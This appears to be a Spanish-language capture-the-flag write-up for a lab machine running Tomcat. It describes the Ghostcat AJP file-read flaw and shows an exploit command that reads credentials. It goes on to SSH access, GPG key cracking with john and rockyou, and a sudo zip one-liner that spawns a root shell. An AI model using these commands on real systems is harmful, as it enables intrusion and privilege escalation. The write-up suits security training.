@@ -1,0 +1,63 @@
+1. en el nmap vemos el puerto 8080 y el 8009 y otros mas.
+
+2. Esta room se basa en la vulnerabilidad ghostcat.
+
+GHOSTCAT:
+https://www.chaitin.cn/en/ghostcat
+https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py
+
+
+	Tomcat : es uno de los servidores de midleware Java mas populares.
+
+	Ghostcat es una vulnerabilidad grave en Tomcat.Debido a una falla en el protocolo AJP, un atacante puede leer 
+	o incluir cualquier archivo en los directorios de aplicaciones web de Tomcat. Por ejemplo, un atacante puede 
+	leer los archivos de configuración de la aplicación web o el código fuente. Además, si la aplicación web de destino 
+	tiene una función de carga de archivos, el atacante puede ejecutar código malicioso en el host de destino explotando
+	la inclusión de archivos a través de la vulnerabilidad de Ghostcat.
+
+	AJP : El protocolo Apache JServ es un protocolo binario que puede enviar solicitudes entrantes desde un servidor web
+	a un servidor de aplicaciones que se encuentra detrás del servidor web.
+
+	
+	Esta vulnerabilidad se confirmó que afectaba a todas las versiones de Tomcat 8/9/7/6 y no se probo con las versiones 
+	mas viejas.
+
+	versiones inmunes :9.0.31, 8.5.51 y 7.0.100
+
+3.Probando la vulnerabilidad :
+	python ghostcat.py 10.10.187.133 -p 8009 -f WEB-INF/web.xml
+
+	nos lista un usuario y contraseña :
+		skyfuck:8730281lkjlkjdqlksalks
+
+4.Probamos con ssh y entramos y obtenemos la flag.
+
+5.Ahora desencriptamos los archivos que tiene en su directorio skyfuck con :
+
+	gpg2john tryhackme.asc > hash
+
+	john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+	y la key que obtenemos es : alexandru
+
+	ahora para desencriptar el pgp usamos :
+		pgp --import archivo.asc
+		pgp --decrypt archivo.pgp
+
+	y nuestra credenciales son :
+
+		merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+
+PRIVESC :
+
+	Al hacer sudo -l vemos que puedo usar zip como sudo sin necesidad de password entonces :
+
+		https://www.hackingarticles.in/linux-for-pentester-zip-privilege-escalation/
+
+	sudo zip new_zip.zip user.txt -T --unzip-command="sh -c /bin/bash"
+
+	
+
+	
+
+		
